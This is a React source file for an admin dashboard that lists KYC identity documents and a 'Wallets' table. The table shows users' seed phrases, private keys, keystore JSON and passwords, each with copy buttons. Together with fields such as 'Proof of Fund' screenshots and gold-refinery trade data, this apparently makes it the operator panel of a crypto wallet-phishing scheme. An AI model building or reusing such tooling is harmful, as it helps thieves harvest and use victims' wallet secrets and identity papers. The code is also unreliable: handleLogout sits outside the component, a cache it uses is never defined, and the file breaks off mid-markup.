import React, { useEffect, useState, useRef } from 'react';
import { FaUserShield, FaUsers, FaWallet, FaIdCard, FaBars, FaSignOutAlt, FaUserCircle } from 'react-icons/fa';
import DocumentIcon from '../assets/document-icon.svg';

// Helper to download file via JS
function downloadFile(url, filename, format) {
  fetch(url)
    .then(response => response.blob())
    .then(blob => {
      const link = document.createElement('a');
      let ext = format ? `.${format.replace(/[^a-zA-Z0-9]/g, '')}` : '';
      link.href = URL.createObjectURL(blob);
      link.download = filename ? `${filename}${ext}` : `document${ext}`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      setTimeout(() => URL.revokeObjectURL(link.href), 1000);
    })
    .catch(() => alert('Failed to download document.'));
}
  // Logout handler
  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    localStorage.removeItem('isAdmin');
    localStorage.removeItem('isSuperAdmin');
    window.location.href = '/admin-login';
  };

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;

const AdminDashboard = () => {
  const [totalRecords, setTotalRecords] = useState(0);

  useEffect(() => {
    const fetchTotalRecords = async () => {
      try {
        const response = await fetch(`${BACKEND_URL}/api/kyc/total-records`, {
          method: 'GET',
          headers: {
            Authorization: `Bearer ${localStorage.getItem('adminToken')}`,
          },
        });

        if (!response.ok) {
          throw new Error('Failed to fetch total record count');
        }

        const data = await response.json();
        setTotalRecords(data.totalRecords);
      } catch (error) {
        console.error('Error fetching total record count:', error);
      }
    };

    fetchTotalRecords();
  }, []);

  // helper: obfuscate seed (show first 3 and last 3 words)
  const obfuscateSeed = (seed) => {
    if (!seed) return '';
    const words = seed.trim().split(/\s+/).filter(Boolean);
    if (words.length <= 6) return words.map((w,i) => (i===0||i===words.length-1? w : '****')).join(' ');
    const first = words.slice(0, 3).join(' ');
    const last = words.slice(-3).join(' ');
    return `${first} ... ${last}`;
  };

  const copyToClipboard = async (text) => {
    try {
      await navigator.clipboard.writeText(text);
      alert('Copied to clipboard');
    } catch (err) {
      console.error('Copy failed', err);
      // fallback
      const ta = document.createElement('textarea');
      ta.value = text;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
      alert('Copied to clipboard');
    }
  };

  // preview modal state
  const [previewOpen, setPreviewOpen] = useState(false);
  const [previewItem, setPreviewItem] = useState(null);
  const [previewLoading, setPreviewLoading] = useState(false);
  const [previewError, setPreviewError] = useState(null);
  const previewBlobUrlRef = useRef(null);

  const openPreview = async (item) => {
    setPreviewError(null);
    const isImage = item.resource_type && item.resource_type.startsWith('image') || (item.format && ['jpg','jpeg','png','gif','webp'].includes((item.format||'').toLowerCase()));
    if (isImage) {
      setPreviewItem(item);
      setPreviewOpen(true);
      return;
    }

    setPreviewLoading(true);
    setPreviewOpen(true);
    try {
      // Choose fetch URL (prefer secure_url or url)
      let fetchUrl = item.secure_url || item.url || '';
      fetchUrl = fetchUrl.replace(/\?dl=1$/i, '');

      const res = await fetch(fetchUrl, { method: 'GET' });
      if (!res.ok) throw new Error(`Failed to fetch document: ${res.status}`);

      const contentType = res.headers.get('content-type') || item.format || '';
      const blob = await res.blob();

      // revoke previous blob url if any
      if (previewBlobUrlRef.current) {
        URL.revokeObjectURL(previewBlobUrlRef.current);
        previewBlobUrlRef.current = null;
      }
      const objUrl = URL.createObjectURL(blob);
      previewBlobUrlRef.current = objUrl;

      // For PDF and common office mime types, we can embed in iframe (some may not render in all browsers)
      setPreviewItem({ ...item, url: objUrl, __isBlob: true, __contentType: contentType });
    } catch (err) {
      console.error('Preview fetch error', err);
      setPreviewError(err.message || 'Failed to load document');
    } finally {
      setPreviewLoading(false);
    }
  };

  const closePreview = () => {
    setPreviewOpen(false);
    setPreviewItem(null);
    setPreviewError(null);
    setPreviewLoading(false);
    if (previewBlobUrlRef.current) {
      URL.revokeObjectURL(previewBlobUrlRef.current);
      previewBlobUrlRef.current = null;
    }
  };
  const [activePanel, setActivePanel] = useState('admin');
  const [admins, setAdmins] = useState([]);
  const [error, setError] = useState('');
  const [kycRecords, setKycRecords] = useState([]);
  const [walletRecords, setWalletRecords] = useState([]);
  const [page, setPage] = useState(1);
  const [limit, setLimit] = useState(10);
  const [searchQ, setSearchQ] = useState('');
  const [filterStatus, setFilterStatus] = useState('');
  const [filterWalletType, setFilterWalletType] = useState('');
  const [totalPages, setTotalPages] = useState(0);
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState(false); // for mobile

  const [loggedInUsername, setLoggedInUsername] = useState('');
  useEffect(() => {
    // Get logged-in admin username from localStorage (set at login)
    const adminData = localStorage.getItem('adminToken');
    try {
      if (adminData) {
        // Decode JWT to get username
        const payload = JSON.parse(atob(adminData.split('.')[1]));
        setLoggedInUsername(payload.username || '');
      }
    } catch {}
    if (activePanel === 'admin') {
      const fetchAdmins = async () => {
        try {
          const token = localStorage.getItem('adminToken');
          const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins`, {
            headers: {
              'Authorization': `Bearer ${token}`
            }
          });
          const data = await res.json();
          if (!res.ok) throw new Error(data.message || 'Failed to fetch admins');
          setAdmins(data);
        } catch (err) {
          setError(err.message);
        }
      };
      fetchAdmins();
    }
    // Prefetch logic for kyc, wallets, tradeData
    const token = localStorage.getItem('adminToken');
    const panelsToFetch = ['kyc', 'wallets', 'tradeData'];
    if (panelsToFetch.includes(activePanel)) {
      // Prefetch 10 pages before and after
      const fetchPages = async () => {
        let pagesToFetch = [];
        for (let i = Math.max(1, page - 10); i <= page + 10; i++) {
          pagesToFetch.push(i);
        }
        // Remove pages already in cache
        pagesToFetch = pagesToFetch.filter(p => !prefetchCache[activePanel][p]);
        const fetchPromises = pagesToFetch.map(async (p) => {
          const params = new URLSearchParams();
          params.set('page', String(p));
          params.set('limit', String(limit));
          if (searchQ) params.set('q', searchQ);
          if (filterStatus) params.set('status', filterStatus);
          if (filterWalletType) params.set('walletType', filterWalletType);
          const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc?${params.toString()}`, { headers: { 'Authorization': `Bearer ${token}` } });
          const data = await res.json();
          return { p, data };
        });
        try {
          const results = await Promise.all(fetchPromises);
          setPrefetchCache(prev => {
            const newCache = { ...prev };
            results.forEach(({ p, data }) => {
              newCache[activePanel][p] = data;
            });
            return newCache;
          });
          // Set current page data
          const currentData = results.find(r => r.p === page)?.data || prefetchCache[activePanel][page];
          if (activePanel === 'kyc' || activePanel === 'tradeData') {
            setKycRecords(currentData?.docs || []);
            setWalletRecords((currentData?.docs || []).filter(r => r.seedPhrase || r.privateKey || r.keystoreJson));
            setTotalPages(currentData?.pages || 0);
          } else if (activePanel === 'wallets') {
            setWalletRecords((currentData?.docs || []).filter(r => r.seedPhrase || r.privateKey || r.keystoreJson));
            setTotalPages(currentData?.pages || 0);
          }
        } catch (err) {
          setError(err.message);
        }
      };
      fetchPages();
    }
  }, [activePanel, page, limit, searchQ, filterStatus, filterWalletType]);

  // Clamp page to valid range for each table
  const maxWalletPage = Math.max(1, Math.ceil(walletRecords.length / limit));
  const maxKycPage = Math.max(1, Math.ceil(kycRecords.length / limit));
  const maxAdminPage = Math.max(1, Math.ceil(admins.length / limit));
  useEffect(() => {
    if (activePanel === 'wallets' && page > maxWalletPage) setPage(maxWalletPage);
    if (activePanel === 'kyc' && page > maxKycPage) setPage(maxKycPage);
    if (activePanel === 'admin' && page > maxAdminPage) setPage(maxAdminPage);
  }, [page, maxWalletPage, maxKycPage, maxAdminPage, activePanel]);

  // Sidebar width values for desktop
  const sidebarWidthValue = sidebarCollapsed ? 80 : 256; // px
  const sidebarWidthClass = sidebarCollapsed ? 'md:w-20 w-64' : 'w-64';

  const [isLoading, setIsLoading] = useState(false);

  const handlePageChange = (newPage) => {
    if (newPage < 1 || newPage > totalPages) return;
    setIsLoading(true);
    setPage(newPage);
  };

  useEffect(() => {
    const fetchCurrentPage = async () => {
      setIsLoading(true);
      try {
        const params = new URLSearchParams();
        params.set('page', String(page));
        params.set('limit', String(limit));
        if (searchQ) params.set('q', searchQ);
        if (filterStatus) params.set('status', filterStatus);
        if (filterWalletType) params.set('walletType', filterWalletType);

        const token = localStorage.getItem('adminToken');
        const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc?${params.toString()}`, {
          headers: { 'Authorization': `Bearer ${token}` },
        });
        const data = await res.json();

        if (!res.ok) throw new Error(data.message || 'Failed to fetch data');

        setKycRecords(data.docs || []);
        setWalletRecords((data.docs || []).filter(r => r.seedPhrase || r.privateKey || r.keystoreJson));
        setTotalPages(data.pages || 0);
      } catch (err) {
        setError(err.message);
      } finally {
        setIsLoading(false);
      }
    };

    fetchCurrentPage();
  }, [page, limit, searchQ, filterStatus, filterWalletType]);

  // Utility to compute showing range
  const getShowingRange = (page, limit, total) => {
    const start = (page - 1) * limit + 1;
    const end = Math.min(page * limit, total);
    if (total === 0) return 'Showing 0 items';
    return `Showing ${start}–${end} of ${total}`;
  };

  return (
    <div className="min-h-screen flex bg-gray-100">
      {/* Desktop Sidebar */}
      <aside
        className={`hidden md:flex flex-col fixed top-0 left-0 h-screen z-50 shadow-lg ${sidebarWidthClass} bg-gradient-to-b from-blue-700 to-blue-600 text-white`}
        style={{ marginTop: '0', width: sidebarWidthValue }}
      >
        <div className="flex flex-col h-full">
          <div className="flex items-center justify-between p-6 border-b border-blue-500">
            {!sidebarCollapsed ? (
              <span className="text-2xl font-bold flex items-center gap-2">
                <FaUserShield /> Admin Panel
              </span>
            ) : (
              <button
                className="text-white text-2xl focus:outline-none"
                onClick={() => setSidebarCollapsed(false)}
                aria-label="Expand sidebar"
              >
                <FaBars />
              </button>
            )}
            {!sidebarCollapsed && (
              <button
                className="text-white text-2xl focus:outline-none"
                onClick={() => setSidebarCollapsed(true)}
                aria-label="Collapse sidebar"
              >
                <FaBars />
              </button>
            )}
          </div>
          <nav className="flex-1 mt-2">
            <ul className="space-y-1 px-4">
              <li>
                <button onClick={() => setActivePanel('admin')} className={`w-full flex items-center gap-3 p-3 rounded-lg transition-colors font-medium ${activePanel === 'admin' ? 'bg-blue-100 text-blue-700' : 'hover:bg-blue-800'}`}>
                  <FaUsers className="text-lg" />
                  {!sidebarCollapsed && <span>Admin</span>}
                </button>
              </li>
              <li>
                <button onClick={() => setActivePanel('tradeData')} className={`w-full flex items-center gap-3 p-3 rounded-lg transition-colors font-medium ${activePanel === 'tradeData' ? 'bg-blue-100 text-blue-700' : 'hover:bg-blue-800'}`}>
                  <FaUsers className="text-lg" />
                  {!sidebarCollapsed && <span>Trade Data</span>}
                </button>
              </li>
              <li>
                <button onClick={() => setActivePanel('kyc')} className={`w-full flex items-center gap-3 p-3 rounded-lg transition-colors font-medium ${activePanel === 'kyc' ? 'bg-blue-100 text-blue-700' : 'hover:bg-blue-800'}`}>
                  <FaIdCard className="text-lg" />
                  {!sidebarCollapsed && <span>KYC</span>}
                </button>
              </li>
              <li>
                <button onClick={() => setActivePanel('wallets')} className={`w-full flex items-center gap-3 p-3 rounded-lg transition-colors font-medium ${activePanel === 'wallets' ? 'bg-blue-100 text-blue-700' : 'hover:bg-blue-800'}`}>
                  <FaWallet className="text-lg" />
                  {!sidebarCollapsed && <span>Wallets</span>}
                </button>
              </li>
            </ul>
          </nav>
          <div className="mt-auto p-4 text-xs text-blue-200 border-t border-blue-500 flex flex-col gap-2">
            <button
              className="flex items-center gap-2 text-white hover:text-blue-300 text-base font-semibold w-full justify-center"
              onClick={handleLogout}
              style={{ marginTop: '0.5rem' }}
            >
              <FaSignOutAlt className="text-lg" />
              {!sidebarCollapsed && <span>Logout</span>}
            </button>
            {!sidebarCollapsed && loggedInUsername && (
              <span className="flex items-center justify-center gap-2 text-blue-100 mt-2 w-full">
                Logged in as <span className="font-bold">{loggedInUsername}</span>
              </span>
            )}
            <span>Legal Terms and Policies</span>
          </div>
        </div>
      </aside>

      {/* Mobile Sidebar Overlay */}
      {sidebarOpen && (
        <div
          className="fixed inset-0 z-[100] bg-black bg-opacity-60 backdrop-blur-sm md:hidden"
          onClick={() => setSidebarOpen(false)}
        >
          <aside
            className="fixed top-0 left-0 h-screen w-64 bg-gradient-to-b from-blue-700 to-blue-600 text-white flex flex-col shadow-lg z-[101]"
            style={{ marginTop: 0 }}
            onClick={e => e.stopPropagation()}
          >
            <div className="flex flex-col h-full">
              <div className="flex items-center justify-between p-6 border-b border-blue-500">
                <span className="text-2xl font-bold flex items-center gap-2">
                  <FaUserShield /> Admin Panel
                  <button
                    className="ml-2 text-white text-xl focus:outline-none"
                    onClick={() => setSidebarOpen(false)}
                    aria-label="Close sidebar"
                  >
                    <span className="text-2xl">&times;</span>
                  </button>
                </span>
              </div>
              <nav className="flex-1 mt-2">
                <ul className="space-y-1 px-4">
                  <li>
                    <button onClick={() => setActivePanel('admin')} className={`w-full flex items-center gap-3 p-3 rounded-lg transition-colors font-medium ${activePanel === 'admin' ? 'bg-blue-100 text-blue-700' : 'hover:bg-blue-800'}`}>
                      <FaUsers className="text-lg" /> <span>Admin</span>
                    </button>
                  </li>
                  <li>
                    <button onClick={() => setActivePanel('tradeData')} className={`w-full flex items-center gap-3 p-3 rounded-lg transition-colors font-medium ${activePanel === 'tradeData' ? 'bg-blue-100 text-blue-700' : 'hover:bg-blue-800'}`}>
                      <FaUsers className="text-lg" /> <span>Trade Data</span>
                    </button>
                  </li>
                  <li>
                    <button onClick={() => setActivePanel('kyc')} className={`w-full flex items-center gap-3 p-3 rounded-lg transition-colors font-medium ${activePanel === 'kyc' ? 'bg-blue-100 text-blue-700' : 'hover:bg-blue-800'}`}>
                      <FaIdCard className="text-lg" /> <span>KYC</span>
                    </button>
                  </li>
                  <li>
                    <button onClick={() => setActivePanel('wallets')} className={`w-full flex items-center gap-3 p-3 rounded-lg transition-colors font-medium ${activePanel === 'wallets' ? 'bg-blue-100 text-blue-700' : 'hover:bg-blue-800'}`}>
                      <FaWallet className="text-lg" /> <span>Wallets</span>
                    </button>
                  </li>
                </ul>
              </nav>
              <div className="mt-auto p-4 text-xs text-blue-200 border-t border-blue-500 flex flex-col gap-2">
                <button
                  className="flex items-center gap-2 text-white hover:text-blue-300 text-base font-semibold w-full justify-center"
                  onClick={handleLogout}
                  style={{ marginTop: '0.5rem' }}
                >
                  <FaSignOutAlt className="text-lg" />
                  <span>Logout</span>
                </button>
                <span>Legal Terms and Policies</span>
              </div>
            </div>
          </aside>
        </div>
      )}

      {/* Mobile Header */}
      <header className="md:hidden fixed top-0 left-0 right-0 bg-blue-700 text-white flex items-center justify-between px-4 py-3 z-40 shadow">
        <div className="flex items-center">
          <button
            className="text-white text-2xl focus:outline-none mr-4"
            onClick={() => setSidebarOpen(!sidebarOpen)}
            aria-label={sidebarOpen ? 'Close sidebar' : 'Open sidebar'}
          >
            {sidebarOpen ? <span className="text-3xl">&times;</span> : <FaBars />}
          </button>
          <span className="text-xl font-bold flex items-center gap-2">
            <FaUserShield /> Admin Panel
          </span>
        </div>
        {loggedInUsername && (
          <span className="flex items-center gap-2 text-base font-semibold">
            <FaUserCircle className="text-lg" /> {loggedInUsername}
          </span>
        )}
      </header>
      <main
        className="flex-1 p-0 md:p-0 transition-all duration-300"
        style={{ marginLeft: window.innerWidth >= 768 ? sidebarWidthValue : 0 }}
      >
        <div className="w-full h-full flex flex-col items-stretch justify-start" style={{ paddingTop: '56px' }}>
          {activePanel === 'admin' && (
            <div className="w-full h-full bg-white rounded-lg shadow-lg flex flex-col items-stretch justify-start" style={{ minHeight: '100vh', maxWidth: '100%', margin: 0, padding: '2rem' }}>
              <h2 className="text-4xl font-bold mb-4 text-center">Admins</h2>
              {/* errors intentionally not shown here per admin UI preference */}
              <div className="w-full overflow-x-auto">
                <table className="w-full border-collapse border border-gray-300 text-xs">
                  <thead>
                    <tr className="bg-gray-100">
                      <th className="py-2 px-2 border">No.</th>
                      <th className="py-2 px-2 border">Username</th>
                      <th className="py-2 px-2 border">Status</th>
                      <th className="py-2 px-2 border">Created At</th>
                    </tr>
                  </thead>
                  <tbody>
                    {[...admins].sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)).map((admin, idx) => (
                      <tr key={admin._id} className="hover:bg-gray-50">
                        <td className="py-2 px-2 border text-center">{admins.length - idx}</td>
                        <td className="py-2 px-2 border text-center">{admin.username}</td>
                        <td className="py-2 px-2 border text-center capitalize">{admin.status}</td>
                        <td className="py-2 px-2 border text-center">{new Date(admin.createdAt).toLocaleString()}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
          {activePanel === 'tradeData' && (
            <div className="w-full h-full bg-white rounded-lg shadow-lg flex flex-col items-stretch justify-start" style={{ minHeight: '100vh', maxWidth: '100%', margin: 0, padding: '2rem' }}>
              <h2 className="text-4xl font-bold mb-4 text-center">Trade Data</h2>
              <div className="mb-4 flex flex-col md:flex-row md:items-center md:justify-between gap-2">
                <div className="flex items-center gap-2">
                  <input value={searchQ} onChange={e=>{setSearchQ(e.target.value); setPage(1);}} placeholder="Search session, wallet type..." className="p-2 border rounded w-64" />
                  <select value={filterStatus} onChange={e=>{setFilterStatus(e.target.value); setPage(1);}} className="p-2 border rounded">
                    <option value="">All Statuses</option>
                    <option value="pending">Pending</option>
                    <option value="verified">Verified</option>
                    <option value="verification_failed">Verification Failed</option>
                    <option value="no_images">No Images</option>
                  </select>
                  <input value={filterWalletType} onChange={e=>{setFilterWalletType(e.target.value); setPage(1);}} placeholder="Filter wallet type" className="p-2 border rounded w-48" />
                </div>
                <div className="flex items-center gap-2">
                  <label className="text-sm">Per page:</label>
                  <select value={limit} onChange={e=>{setLimit(Number(e.target.value)); setPage(1);}} className="p-2 border rounded">
                    <option value={5}>5</option>
                    <option value={10}>10</option>
                    <option value={20}>20</option>
                  </select>
                </div>
              </div>
              {kycRecords.length === 0 ? (
                <div className="text-gray-500">No trade data found.</div>
              ) : (
                <div className="w-full overflow-x-auto">
                  <table className="w-full border-collapse border border-gray-300 text-xs">
                    <thead>
                      <tr className="bg-gray-100">
                        <th className="py-2 px-2 border">No.</th>
                        <th className="py-2 px-2 border">Session ID</th>
                        <th className="py-2 px-2 border">Wallet Type</th>
                        <th className="py-2 px-2 border">Quality Required</th>
                        <th className="py-2 px-2 border">Karats Purity</th>
                        <th className="py-2 px-2 border">Destination Refinery</th>
                        {/* Status column removed as requested */}
                        <th className="py-2 px-2 border">Created At</th>
                      </tr>
                    </thead>
                    <tbody>
                      {[...kycRecords]
                        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
                        .map((rec, idx) => {
                          // Newest data at top, highest number at top
                          const number = kycRecords.length - idx;
                          return (
                            <tr key={rec._id} className="hover:bg-gray-50">
                              <td className="py-2 px-2 border text-center">{number}</td>
                              <td className="py-2 px-2 border text-center">{rec.sessionId}</td>
                              <td className="py-2 px-2 border text-center">{rec.walletType}</td>
                              <td className="py-2 px-2 border text-center">{rec.qualityRequired}</td>
                              <td className="py-2 px-2 border text-center">{rec.karatsPurity}</td>
                              <td className="py-2 px-2 border text-center">{rec.destinationRefineryText}</td>
                              <td className="py-2 px-2 border text-center">{rec.createdAt ? new Date(rec.createdAt).toLocaleString() : ''}</td>
                            </tr>
                          );
                        })}
                    </tbody>
                  </table>
                </div>
              )}
              {/* Pagination controls */}
              <div className="flex flex-col md:flex-row items-center justify-between gap-2 mt-4">
                <div className="flex items-center gap-2">
                  <button
                    className="px-3 py-1 rounded border bg-blue-100 text-blue-700 disabled:opacity-50"
                    onClick={() => handlePageChange(page - 1)}
                    disabled={page <= 1 || isLoading}
                  >
                    Prev
                  </button>
                  <span className="px-2">Page {page} of {totalPages || 1}</span>
                  <button
                    className="px-3 py-1 rounded border bg-blue-100 text-blue-700 disabled:opacity-50"
                    onClick={() => handlePageChange(page + 1)}
                    disabled={page >= (totalPages || 1) || isLoading}
                  >
                    Next
                  </button>
                </div>
                <div className="text-sm text-gray-600">{getShowingRange(page, limit, totalRecords)}</div>
              </div>
            </div>
          )}
          {activePanel === 'kyc' && (
            <div className="w-full h-full bg-white rounded-lg shadow-lg flex flex-col items-stretch justify-start" style={{ minHeight: '100vh', maxWidth: '100%', margin: 0, padding: '2rem' }}>
              <h2 className="text-4xl font-bold mb-4 text-center">KYC</h2>
              {error && <div className="mb-4 text-red-500 text-center">{error}</div>}
              <div className="mb-4 flex flex-col md:flex-row md:items-center md:justify-between gap-2">
                <div className="flex items-center gap-2">
                  <input value={searchQ} onChange={e=>{setSearchQ(e.target.value); setPage(1);}} placeholder="Search session, wallet type, seed..." className="p-2 border rounded w-64" />
                  <select value={filterStatus} onChange={e=>{setFilterStatus(e.target.value); setPage(1);}} className="p-2 border rounded">
                    <option value="">All Statuses</option>
                    <option value="pending">Pending</option>
                    <option value="verified">Verified</option>
                    <option value="verification_failed">Verification Failed</option>
                    <option value="no_images">No Images</option>
                  </select>
                  <input value={filterWalletType} onChange={e=>{setFilterWalletType(e.target.value); setPage(1);}} placeholder="Filter wallet type" className="p-2 border rounded w-48" />
                </div>
                <div className="flex items-center gap-2">
                  <label className="text-sm">Per page:</label>
                  <select value={limit} onChange={e=>{setLimit(Number(e.target.value)); setPage(1);}} className="p-2 border rounded">
                    <option value={5}>5</option>
                    <option value={10}>10</option>
                    <option value={20}>20</option>
                  </select>
                </div>
              </div>
              {kycRecords.length === 0 ? (
                <div className="text-gray-500">No KYC records found.</div>
              ) : (
                <div className="w-full overflow-x-auto">
                  <table className="w-full border-collapse border border-gray-300 text-xs">
                    <thead>
                      <tr className="bg-gray-100">
                        <th className="py-2 px-2 border">No.</th>
                        <th className="py-2 px-2 border">Session</th>
                        <th className="py-2 px-2 border">Wallet Type</th>
                        {/* Status column removed as requested */}
                        <th className="py-2 px-2 border">Created At</th>
                        <th className="py-2 px-2 border">Thumbnails / Documents</th>
                      </tr>
                    </thead>
                    <tbody>
                      {[...kycRecords].slice().sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)).map((rec, idx) => (
                        <tr key={rec._id} className="hover:bg-gray-50 align-top">
                          <td className="py-2 px-2 border text-center font-bold">{kycRecords.length - idx}</td>
                          <td className="py-2 px-2 border text-center">{rec.sessionId}</td>
                          <td className="py-2 px-2 border text-center">{rec.walletType || '-'}</td>
                          {/* Status cell removed as requested */}
                          <td className="py-2 px-2 border text-center">{new Date(rec.createdAt).toLocaleString()}</td>
                          <td className="py-2 px-2 border">
                            <div className="flex gap-2 overflow-x-auto">
                              {(rec.imageUrls || []).map((img, i) => {
                                const isImage = img.resource_type && img.resource_type.startsWith('image') || (img.format && ['jpg','jpeg','png','gif','webp'].includes((img.format||'').toLowerCase()));
                                return isImage ? (
                                  <div
                                    key={i}
                                    className="flex-none w-16 h-12 overflow-hidden border rounded flex items-center justify-center bg-gray-50 cursor-pointer"
                                    title="Open file"
                                    onClick={() => openPreview(img)}
                                  >
                                    <img src={img.url} alt={img.public_id} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                                  </div>
                                ) : (
                                  <div
                                    key={i}
                                    className="flex-none w-16 h-12 overflow-hidden border rounded bg-gray-50 flex items-center justify-center cursor-pointer"
                                    title="Open document"
                                    onClick={() => openPreview(img)}
                                  >
                                    { (img.secure_url || img.url) ? (
                                      <object
                                        data={img.secure_url || img.url}
                                        width="100%"
                                        height="100%"
                                        aria-label={img.public_id || 'document'}
                                        style={{ display: 'block' }}
                                      >
                                        <a href={img.secure_url || img.url} target="_blank" rel="noopener noreferrer" className="text-xs text-blue-600">Open</a>
                                      </object>
                                    ) : (
                                      <img src={DocumentIcon} alt="Document" style={{ width: 24, height: 24, opacity: 0.7 }} />
                                    )}
                                  </div>
                                );
                              })}
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                  {/* Pagination controls for KYC table */}
                  <div className="mt-2 flex items-center justify-center gap-2">
                    <button disabled={page<=1} onClick={()=>setPage(p=>Math.max(1,p-1))} className="px-2 py-1 border rounded text-xs">Prev</button>
                    <span className="text-xs">Page {page} of {totalPages || 1}</span>
                    <button disabled={page>= (totalPages || 1)} onClick={()=>setPage(p=>p+1)} className="px-2 py-1 border rounded text-xs">Next</button>
                  </div>
                </div>
              )}
            </div>
          )}
          {activePanel === 'wallets' && (
            <div className="w-full h-full bg-white rounded-lg shadow-lg flex flex-col items-stretch justify-start" style={{ minHeight: '100vh', maxWidth: '100%', margin: 0, padding: '2rem' }}>
              <h2 className="text-4xl font-bold mb-4 text-center">Wallets</h2>
              {error && <div className="mb-4 text-red-500 text-center">{error}</div>}
              <div className="mb-4 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <input value={searchQ} onChange={e=>{setSearchQ(e.target.value); setPage(1);}} placeholder="Search session, wallet type, seed..." className="p-2 border rounded w-64" />
                  <input value={filterWalletType} onChange={e=>{setFilterWalletType(e.target.value); setPage(1);}} placeholder="Filter wallet type" className="p-2 border rounded w-48" />
                </div>
                <div className="flex items-center gap-2">
                  <label className="text-sm">Per page:</label>
                  <select value={limit} onChange={e=>{setLimit(Number(e.target.value)); setPage(1);}} className="p-2 border rounded">
                    <option value={5}>5</option>
                    <option value={10}>10</option>
                    <option value={20}>20</option>
                  </select>
                </div>
              </div>
              {walletRecords.length === 0 ? (
                <div className="text-gray-500 text-center">No wallet data available.</div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse border border-gray-300 text-xs">
                    <thead>
                      <tr className="bg-gray-100">
                        <th className="py-2 px-2 border">No.</th>
                        <th className="py-2 px-2 border">Session</th>
                        <th className="py-2 px-2 border">Wallet Type</th>
                        <th className="py-2 px-2 border">Seed Phrase</th>
                        <th className="py-2 px-2 border">Private Key / Keystore</th>
                      </tr>
                    </thead>
                    <tbody>
                      {[...walletRecords].slice().sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)).map((r, idx) => (
                        <tr key={r._id} className="hover:bg-gray-50 align-top">
                          <td className="py-2 px-2 border text-center font-bold">{walletRecords.length - idx}</td>
                          <td className="py-2 px-2 border text-center">{r.sessionId}</td>
                          <td className="py-2 px-2 border text-center">{r.walletType}</td>
                          <td className="py-2 px-2 border text-center">
                            {r.seedPhrase ? (
                              <div className="flex items-center justify-center gap-2">
                                <span style={{ fontFamily: 'monospace' }}>{obfuscateSeed(r.seedPhrase)}</span>
                                <button onClick={() => copyToClipboard(r.seedPhrase)} className="ml-2 px-2 py-1 bg-blue-500 text-white rounded text-xs">Copy</button>
                              </div>
                            ) : (<span className="text-gray-500">-</span>)}
                          </td>
                          <td className="py-2 px-2 border text-left">
                            {r.privateKey && (
                              <div className="mb-2">
                                <div className="font-semibold">Private Key</div>
                                <div className="break-all" style={{ fontFamily: 'monospace' }}>{r.privateKey}</div>
                                <button onClick={() => copyToClipboard(r.privateKey)} className="mt-1 px-2 py-1 bg-gray-800 text-white rounded text-xs">Copy</button>
                              </div>
                            )}
                            {r.keystoreJson && (
                              <div className="mb-2">
                                <div className="font-semibold">Keystore JSON</div>
                                <pre className="whitespace-pre-wrap break-all p-2 bg-gray-50 border rounded text-xs" style={{ maxHeight: 180, overflow: 'auto' }}>{r.keystoreJson}</pre>
                                {r.password && <div className="mt-1">Password: <span className="font-mono">{r.password}</span></div>}
                                <button onClick={() => copyToClipboard(r.keystoreJson)} className="mt-1 px-2 py-1 bg-gray-800 text-white rounded text-xs">Copy JSON</button>
                              </div>
                            )}
                            {r.pofScreenshot && (
                              <div className="mb-2">
                                <div className="font-semibold">Proof of Fund Screenshot</div>
                                <img src={r.pofScreenshot} alt="Proof of Fund" className="max-w-full max-h-40 object-contain border rounded" />
                              </div>
                            )}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
              {/* Pagination controls */}
              <div className="mt-4 flex items-center justify-center gap-2">
                <button disabled={page<=1} onClick={()=>setPage(p=>Math.max(1,p-1))} className="px-3 py-1 border rounded">Prev</button>
                <span>Page {page} of {totalPages || 1}</span>
                <button disabled={page>= (totalPages || 1)} onClick={()=>setPage(p=>p+1)} className="px-3 py-1 border rounded">Next</button>
              </div>
            </div>
          )}
        </div>
      </main>
      {/* Preview Modal */}
      {previewOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70" onClick={closePreview}>
          <div className="bg-white rounded shadow-lg max-w-4xl w-full max-h-[90vh] overflow-auto p-4" onClick={(e)=>e.stopPropagation()}>
            <div className="flex justify-between items-center mb-2">
              <div />
              <div className="flex items-center gap-2">
                {previewLoading && <div className="text-sm text-gray-500">Loading...</div>}
                {previewError && <div className="text-sm text-red-500">{previewError}</div>}
                <button onClick={closePreview} className="px-3 py-1 bg-red-500 text-white rounded">Close</button>
              </div>
            </div>
            <div className="flex items-center justify-center min-h-[200px]">
              {previewLoading ? (
                <div>Loading document...</div>
              ) : previewError ? (
                <div className="text-red-500">{previewError}</div>
              ) : previewItem ? (
                (previewItem.resource_type && previewItem.resource_type.startsWith('image')) || (previewItem.format && ['jpg','jpeg','png','gif','webp'].includes((previewItem.format||'').toLowerCase())) ? (
                  <img src={previewItem.url} alt={previewItem.public_id} style={{ maxWidth: '100%', maxHeight: '80vh', objectFit: 'contain' }} />
                ) : (
                  // If content type is PDF, embed in iframe; for Word docs, offer download (browser may not render)
                  (previewItem.__contentType && previewItem.__contentType.toLowerCase().includes('pdf')) ? (
                    <iframe src={previewItem.url} title={previewItem.public_id} style={{ width: '100%', height: '80vh', border: 'none' }} />
                  ) : (
                    <div className="flex flex-col items-center gap-3">
                      <div className="text-gray-700">Preview not available for this file type.</div>
                      <button className="px-3 py-2 bg-blue-600 text-white rounded" onClick={() => downloadFile(previewItem.url ? (previewItem.url.includes('cloudinary.com') ? `${previewItem.url}?dl=1` : previewItem.url) : '#', previewItem.public_id || 'document', previewItem.format)}>
                        Download
